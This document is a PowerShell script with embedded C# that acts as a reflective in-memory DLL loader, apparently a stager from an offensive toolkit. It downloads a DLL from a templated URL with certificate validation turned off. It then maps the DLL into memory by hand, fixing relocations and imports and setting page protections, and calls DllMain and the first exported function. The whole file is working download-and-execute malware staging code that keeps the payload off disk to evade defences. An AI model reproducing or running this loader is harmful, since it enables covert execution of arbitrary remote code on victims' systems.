param([String]$DllUrl="%%url%%")

Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class MemoryDllLoader {
    private const UInt16 IMAGE_DOS_SIGNATURE = 0x5A4D;
    private const UInt32 IMAGE_NT_SIGNATURE = 0x00004550;
    private const UInt32 MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000;
    private const UInt32 PAGE_NOACCESS = 0x01, PAGE_READONLY = 0x02, PAGE_READWRITE = 0x04, PAGE_EXECUTE = 0x10, PAGE_EXECUTE_READ = 0x20, PAGE_EXECUTE_READWRITE = 0x40;
    private const UInt32 IMAGE_FILE_DLL = 0x2000;
    private const int DLL_PROCESS_ATTACH = 1, IMAGE_REL_BASED_DIR64 = 10, IMAGE_DIRECTORY_ENTRY_EXPORT = 0, IMAGE_DIRECTORY_ENTRY_IMPORT = 1, IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;

    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Ansi, EntryPoint="GetProcAddress")]
    private static extern IntPtr GetProcAddressOrdinal(IntPtr hModule, IntPtr lpProcName);

    [DllImport("kernel32", SetLastError=true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32", SetLastError=true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32", SetLastError=true)]
    private static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32", SetLastError=true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32", SetLastError=true)]
    private static extern int GetLastError();

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate bool DllMain(IntPtr hinstDLL, UInt32 fdwReason, IntPtr lpReserved);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    public delegate bool SomeExportedFunction();

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DOS_HEADER {
        public UInt16 e_magic, e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=4)] public UInt16[] e_res;
        public UInt16 e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=10)] public UInt16[] e_res2;
        public Int32 e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_FILE_HEADER {
        public UInt16 Machine, NumberOfSections;
        public UInt32 TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader, Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DATA_DIRECTORY {
        public UInt32 VirtualAddress, Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_OPTIONAL_HEADER64 {
        public UInt16 Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public UInt32 SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment, FileAlignment;
        public UInt16 MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public UInt32 Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public UInt16 Subsystem, DllCharacteristics;
        public UInt64 SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public UInt32 LoaderFlags, NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_NT_HEADERS64 {
        public UInt32 Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=8)]
        public byte[] Name;
        public UInt32 VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers;
        public UInt16 NumberOfRelocations, NumberOfLinenumbers;
        public UInt32 Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_IMPORT_DESCRIPTOR {
        public UInt32 OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_THUNK_DATA64 {
        public UInt64 AddressOfData;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_BASE_RELOCATION {
        public UInt32 VirtualAddress, SizeOfBlock;
    }

    private byte[] _dllBytes;
    private IntPtr _baseAddr;
    private IMAGE_DOS_HEADER _dos;
    private IMAGE_NT_HEADERS64 _nt;
    private IMAGE_SECTION_HEADER[] _secs;
    private Dictionary<string, IntPtr> _exports;

    public MemoryDllLoader(byte[] dllBytes) { _dllBytes = dllBytes; }

    public void Load() {
        ParseHeaders();
        MapSections();
        HandleRelocations();
        FixImports();
        ProtectSections();
        CallDllMain();
        BuildExportMap();
    }

    private void ParseHeaders() {
        _dos = BytesToStruct<IMAGE_DOS_HEADER>(0);
        if (_dos.e_magic != IMAGE_DOS_SIGNATURE) throw new Exception("Bad DOS sig");
        _nt = BytesToStruct<IMAGE_NT_HEADERS64>(_dos.e_lfanew);
        if (_nt.Signature != IMAGE_NT_SIGNATURE) throw new Exception("Bad PE sig");
        if ((_nt.FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) throw new Exception("File is not a DLL");
    }

    private void MapSections() {
        _baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)_nt.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (_baseAddr == IntPtr.Zero) throw new Exception("VirtualAlloc fail");
        Marshal.Copy(_dllBytes, 0, _baseAddr, (int)_nt.OptionalHeader.SizeOfHeaders);
        int secOfs = _dos.e_lfanew + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64));
        _secs = new IMAGE_SECTION_HEADER[_nt.FileHeader.NumberOfSections];
        for (int i = 0; i < _secs.Length; i++) {
            _secs[i] = BytesToStruct<IMAGE_SECTION_HEADER>(secOfs);
            secOfs += Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));
            if (_secs[i].PointerToRawData != 0 && _secs[i].SizeOfRawData != 0) {
                IntPtr dest = (IntPtr)((long)_baseAddr + _secs[i].VirtualAddress);
                Marshal.Copy(_dllBytes, (int)_secs[i].PointerToRawData, dest, (int)_secs[i].SizeOfRawData);
            }
        }
    }

    private void HandleRelocations() {
        var dir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (dir.Size == 0) return;
        long delta = (long)_baseAddr - (long)_nt.OptionalHeader.ImageBase;
        if (delta == 0) return;
        long cur = (long)_baseAddr + dir.VirtualAddress, end = cur + dir.Size;
        while (cur < end) {
            IMAGE_BASE_RELOCATION blk = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure((IntPtr)cur, typeof(IMAGE_BASE_RELOCATION));
            if (blk.SizeOfBlock == 0) break;
            int entryCount = (int)((blk.SizeOfBlock - Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION))) / 2);
            long entryPtr = cur + Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < entryCount; i++) {
                UInt16 val = (UInt16)Marshal.ReadInt16((IntPtr)(entryPtr + 2 * i));
                int type = val >> 12, off = val & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    long patchAddr = (long)_baseAddr + blk.VirtualAddress + off;
                    long orig = Marshal.ReadInt64((IntPtr)patchAddr);
                    Marshal.WriteInt64((IntPtr)patchAddr, orig + delta);
                }
            }
            cur += blk.SizeOfBlock;
        }
    }

    private void FixImports() {
        var dir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (dir.Size == 0) return;
        long impPtr = (long)_baseAddr + dir.VirtualAddress;
        while (true) {
            IMAGE_IMPORT_DESCRIPTOR desc = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure((IntPtr)impPtr, typeof(IMAGE_IMPORT_DESCRIPTOR));
            if (desc.Name == 0) break;
            string dllName = PtrToAnsi((IntPtr)((long)_baseAddr + desc.Name));
            IntPtr hMod = LoadLibraryA(dllName);
            if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);
            long thunk = (long)_baseAddr + desc.FirstThunk;
            while (true) {
                IMAGE_THUNK_DATA64 t = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure((IntPtr)thunk, typeof(IMAGE_THUNK_DATA64));
                if (t.AddressOfData == 0) break;
                bool byOrd = (t.AddressOfData & 0x8000000000000000) != 0;
                IntPtr fPtr;
                if (byOrd) {
                    UInt16 ordinalVal = (UInt16)(t.AddressOfData & 0xFFFF);
                    fPtr = GetProcAddressOrdinal(hMod, (IntPtr)ordinalVal);
                    if (fPtr == IntPtr.Zero) throw new Exception("GetProcAddress (ordinal) fail: " + ordinalVal);
                } else {
                    long namePtr = (long)_baseAddr + (long)t.AddressOfData + 2;
                    string fn = PtrToAnsi((IntPtr)namePtr);
                    fPtr = GetProcAddress(hMod, fn);
                    if (fPtr == IntPtr.Zero) throw new Exception("GetProcAddress fail: " + fn);
                }
                Marshal.WriteInt64((IntPtr)thunk, fPtr.ToInt64());
                thunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
            }
            impPtr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
        }
    }

    private void ProtectSections() {
        for (int i = 0; i < _secs.Length; i++) {
            if (_secs[i].VirtualSize == 0) continue;
            UInt32 ch = _secs[i].Characteristics;
            bool ex = (ch & 0x20000000) != 0, rd = (ch & 0x40000000) != 0, wr = (ch & 0x80000000) != 0;
            UInt32 prot = ex ? (wr ? PAGE_EXECUTE_READWRITE : (rd ? PAGE_EXECUTE_READ : PAGE_EXECUTE))
                             : (wr ? PAGE_READWRITE : (rd ? PAGE_READONLY : PAGE_NOACCESS));
            IntPtr addr = (IntPtr)((long)_baseAddr + _secs[i].VirtualAddress);
            UIntPtr sz = (UIntPtr)(_secs[i].VirtualSize != 0 ? _secs[i].VirtualSize : _secs[i].SizeOfRawData);
            UInt32 oldP;
            if (!VirtualProtect(addr, sz, prot, out oldP)) throw new Exception("VirtualProtect failed, code " + GetLastError());
        }
    }

    private void CallDllMain() {
        if (_nt.OptionalHeader.AddressOfEntryPoint == 0) return;
        IntPtr ep = (IntPtr)((long)_baseAddr + _nt.OptionalHeader.AddressOfEntryPoint);
        DllMain dm = (DllMain)Marshal.GetDelegateForFunctionPointer(ep, typeof(DllMain));
        if (!dm(_baseAddr, DLL_PROCESS_ATTACH, IntPtr.Zero)) throw new Exception("DllMain returned FALSE");
    }

    private void BuildExportMap() {
        _exports = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);
        var dir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (dir.Size == 0) return;
        long expBase = (long)_baseAddr + dir.VirtualAddress;
        UInt32 numFuncs = (UInt32)Marshal.ReadInt32((IntPtr)(expBase + 0x14));
        UInt32 numNames = (UInt32)Marshal.ReadInt32((IntPtr)(expBase + 0x18));
        UInt32 funcTbl = (UInt32)Marshal.ReadInt32((IntPtr)(expBase + 0x1C));
        UInt32 nameTbl = (UInt32)Marshal.ReadInt32((IntPtr)(expBase + 0x20));
        UInt32 ordTbl  = (UInt32)Marshal.ReadInt32((IntPtr)(expBase + 0x24));
        for (int i = 0; i < numNames; i++) {
            UInt32 nameRva = (UInt32)Marshal.ReadInt32((IntPtr)((long)_baseAddr + nameTbl + i*4));
            string fname = PtrToAnsi((IntPtr)((long)_baseAddr + nameRva));
            UInt16 ordinal = (UInt16)Marshal.ReadInt16((IntPtr)((long)_baseAddr + ordTbl + i*2));
            UInt32 funcRva = (UInt32)Marshal.ReadInt32((IntPtr)((long)_baseAddr + funcTbl + ordinal*4));
            IntPtr fAddr = (IntPtr)((long)_baseAddr + funcRva);
            if (!_exports.ContainsKey(fname)) _exports.Add(fname, fAddr);
        }
    }

    public IntPtr GetProcAddress(string name) {
        if (_exports == null || _exports.Count == 0) throw new Exception("No exports");
        if (_exports.ContainsKey(name)) return _exports[name];
        throw new Exception("Export not found: " + name);
    }

    public string[] GetExportedFunctionNames() {
        if (_exports == null) return new string[0];
        return new List<string>(_exports.Keys).ToArray();
    }

    private T BytesToStruct<T>(int offset) where T : struct {
        IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));
        Marshal.Copy(_dllBytes, offset, buf, Marshal.SizeOf(typeof(T)));
        T res = (T)Marshal.PtrToStructure(buf, typeof(T));
        Marshal.FreeHGlobal(buf);
        return res;
    }

    private static string PtrToAnsi(IntPtr p) {
        return p == IntPtr.Zero ? null : Marshal.PtrToStringAnsi(p);
    }
}
"@

Write-Host "[INFO] Attempting to fetch DLL from $DllUrl"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try { $bytes = (New-Object System.Net.WebClient).DownloadData($DllUrl) }
catch { Write-Host "[CRIT!] Download failed: $($_.Exception.Message)"; return }
if (!$bytes -or $bytes.Length -eq 0) { Write-Host "[CRIT!] Empty payload"; return }
Write-Host "[INFO] Downloaded $($bytes.Length) bytes"
try {
    $loader = [MemoryDllLoader]::new($bytes)
    $loader.Load()
    Write-Host "[ OUT ] DLL mapped to memory successfully!"
} catch {
    Write-Host "[CRIT!] Loader error: $($_.Exception.Message)"
    return
}
$allExports = $loader.GetExportedFunctionNames()
if ($allExports.Count -eq 0) {
    Write-Host "[INFO] No exports found. Done."
} else {
    Write-Host "[INFO] Found $($allExports.Count) export(s): $($allExports -join ', ')"
    $ExportName = $allExports[0]
    try {
        $ptr = $loader.GetProcAddress($ExportName)
        $hex = ([Int64]$ptr).ToString("X")
        Write-Host "[INFO] Found export '$ExportName' at 0x$hex"
        $delegateType = [MemoryDllLoader+SomeExportedFunction]
        $del = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $delegateType)
        Write-Host "[ OUT ] Invoking $ExportName ..."
        $ret = $del.Invoke()
        Write-Host "[ OUT ] Export returned: $ret"
    }
    catch {
        Write-Host "[INFO] Export call failed: $($_.Exception.Message)"
    }
}
Write-Host "[FINAL] Done!"
